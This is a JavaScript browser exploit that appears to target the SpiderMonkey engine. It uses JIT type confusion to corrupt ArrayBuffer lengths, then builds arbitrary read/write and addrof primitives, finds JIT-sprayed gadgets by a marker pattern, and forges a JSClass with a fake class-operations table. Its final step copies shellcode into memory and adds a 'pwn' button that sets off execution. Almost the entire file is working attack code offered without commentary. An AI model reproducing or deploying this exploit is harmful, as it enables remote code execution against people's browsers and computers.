var conversion_buffer = new ArrayBuffer(8);
var f64 = new Float64Array(conversion_buffer);
var i32 = new Uint32Array(conversion_buffer);

var BASE32 = 0x100000000;
function f2i(f) {
    f64[0] = f;
    return i32[0] + BASE32 * i32[1];
}

function i2f(i) {
    i32[0] = i % BASE32;
    i32[1] = i / BASE32;
    return f64[0];
}

function hex(addr){
    return '0x'+addr.toString(16);
}
function print(msg) {
    console.log(msg);
//    document.body.innerText += '\n[+]: '+msg ;
    document.body.innerHTML += '<br>[+]: '+msg ;
}

function some(buf,addr){
	buf.jjj=i2f(addr);
}
function pwn(){
	buf=[];
	for(let i=0;i<0x10;i++)
		buf.push(new ArrayBuffer(0x60));
	var abuf = buf[5];
	var e=new Uint32Array(abuf);
	e[0]=0x61626364;
	e[1]=0x31323334;
	const arr = [e,e,e,e,e];
	function vuln(a1){
		if(arr.length==0){
			arr[3] = e;
		}
		const v11 =  arr.pop();
		v11[a1] = 0x100;
		for(let i =0;i<100000;i++){}
	
	}
	p =  [new Uint8Array(abuf),e,e];
	arr.__proto__=p;
	for(let i=0;i<2000;i++){
		vuln(34);
	}

	for(let i=0;i<buf.length;i++)
		print(i+' '+ buf[i].byteLength);
	
	var oob = new Uint32Array(buf[6]);
	var oob64 = new Float64Array(buf[6]);
	var victim = new Uint32Array(buf[7]);
	var victim64 = new Float64Array(buf[7]);
	
	func = function func() {
	  const magic = 4.183559446463817e-216;
	
	  const g1 = 1.4501798452584495e-277
	  const g2 = 1.4499730218924257e-277
	  const g3 = 1.4632559875735264e-277
	  const g4 = 1.4364759325952765e-277
	  const g5 = 1.450128571490163e-277
	  const g6 = 1.4501798485024445e-277
	  const g7 = 1.4345589835166586e-277
	  const g8 = 1.616527814e-314
	}
	buf[7].leak = func;
	for (i=0;i<100000;i++) func();

	
	buf7_addr = f2i(oob64[16])*2 - 0x40 ;	
	buf7_group_addr = f2i(oob64[12]);	
	buf7_slots_addr = f2i(oob64[14]);	
	
	print("buf7_addr "+hex(buf7_addr));
	print("buf7_group_addr "+hex(buf7_group_addr));
	print("buf7_slots_addr "+hex(buf7_slots_addr));
	
	function readptr(addr){
		oob64[16] = i2f(addr/2);
		oob[34] = 0x100;
		ptrleak = new Uint32Array(buf[7]);
		leak = ptrleak[0] + (ptrleak[1]&0x7fff)*0x100000000;
		return leak;
	}
	function addrof(obj){
		buf[7].leak = obj;
		return readptr(buf7_slots_addr);
	}
	function write64(addr,data){
		oob64[16] = i2f(addr/2);
		oob[34] = 0x100;
		towrite = new Float64Array(buf[7]);
		towrite[0] = i2f(data);
	}
	
	function get_jit_addr(slots_addr){
//		func_addr = readptr(slots_addr);
		func_addr =  addrof(func);
		print("func_addr "+hex(func_addr));
		func_some = readptr(func_addr+0x30);
		print("func_some "+hex(func_some));
		jit_addr = readptr(func_some);
		print("jit_addr "+hex(jit_addr));
	
		jit_addr = jit_addr - 0xff0;
		for(let i=0;i<3;i++){
			offset=-1;
			oob64[16] = i2f(jit_addr/2);
			oob[34] = 0xff0+0x100;
			tmp = new Uint8Array(buf[7]);
			for(let j=0;j<0xff0;j++){
				if(tmp[j+0]==0x37 &&
				   tmp[j+1]==0x13 &&
				   tmp[j+2]==0x37 &&
				   tmp[j+3]==0x13 &&
				   tmp[j+4]==0x37 &&
				   tmp[j+5]==0x13 &&
				   tmp[j+6]==0x37 &&
				   tmp[j+7]==0x13){
					offset=j;
					break;
				}
			}
			if(offset!=-1)break;
			jit_addr+=0xff0;
		}
		print(hex(offset));
		return jit_addr+offset+8+6;
	}
	jit_addr = get_jit_addr(buf7_slots_addr);
	print("jit_addr "+hex(jit_addr));

	function gen_fake_jsclass(group_addr){
		group_jsclass = readptr(group_addr);
		print("group_jsclass "+hex(group_jsclass));
		fake_jsclass_array = new ArrayBuffer(0x30);
		fake_cops_array = new ArrayBuffer(0x60);
		shellcode = new Uint8Array(0x1000);

		fake_jsclass_addr = addrof(fake_jsclass_array)+0x40;
		fake_cops_addr = addrof(fake_cops_array) + 0x40;
		
	
		fake_jsclass = new Float64Array(fake_jsclass_array);
		fake_cops = new Float64Array(fake_cops_array);
	
		fake_jsclass[0]=i2f(readptr(group_jsclass+0x0));//name
		fake_jsclass[1]=i2f(readptr(group_jsclass+0x8));//flags
		fake_jsclass[2]=i2f(readptr(group_jsclass+0x10));//cOps
		fake_jsclass[3]=i2f(readptr(group_jsclass+0x18));//spec
		fake_jsclass[4]=i2f(readptr(group_jsclass+0x20));//ext
		fake_jsclass[5]=i2f(readptr(group_jsclass+0x28));//oOps
		print("fake jsclass: "+hex(fake_jsclass_addr));
		print(fake_jsclass);
	
		cops_addr = f2i(fake_jsclass[2]);
		//cops copy
		for(let i =0;i<12;i++){
			fake_cops[i] = i2f(readptr(cops_addr+0x8*i));
		}
		print("fake cops: "+hex(fake_cops_addr));
		print(fake_cops);
		fake_jsclass[2] = i2f(fake_cops_addr);
		fake_cops[0] = i2f(jit_addr);

		shellcode_obj_addr = addrof(shellcode) ;
		shellcode_addr = readptr(shellcode_obj_addr+0x38) ;
		print(hex(shellcode_obj_addr));
		print(hex(shellcode_addr));



		for(let i=0;i<sc.length;i++){
			shellcode[i] = sc[i];
		}
		write64(group_addr,fake_jsclass_addr);
    		document.body.innerHTML += '<br><input type="button" onclick="some(buf[7],shellcode_addr)" value="pwn">' ;
	
	
	}
	
	gen_fake_jsclass(buf7_group_addr);
}


